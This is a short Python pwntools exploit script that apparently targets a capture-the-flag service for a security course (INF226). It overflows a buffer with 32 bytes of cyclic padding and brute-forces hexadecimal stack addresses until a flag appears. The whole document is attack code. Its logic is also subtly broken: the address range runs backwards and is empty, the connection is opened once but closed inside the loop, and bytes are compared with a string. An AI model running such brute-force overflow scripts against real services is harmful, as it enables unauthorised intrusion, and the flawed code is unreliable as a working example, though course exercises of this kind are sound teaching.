#!/usr/bin/python3

from pwn import *

context.log_level = 'debug'

start = 0x7ffffffff000
stop = 0x7fffffffb000
#print(start)
#print(format(start,'X'))
def letsgooo():
    io = remote('inf226.puffling.no', 7003)
    for i in range(start, stop):
        try:
            io.recvuntil(b'1. ')
            buffer = cyclic(32) + format(i,'X')
            io.sendline(buffer)
            r = io.recvall()

            if "INF226{" in r:
                print(r)
                io.close()
                break 
            
            io.close() 

        except EOFError:
            print(EOFError)


letsgooo()

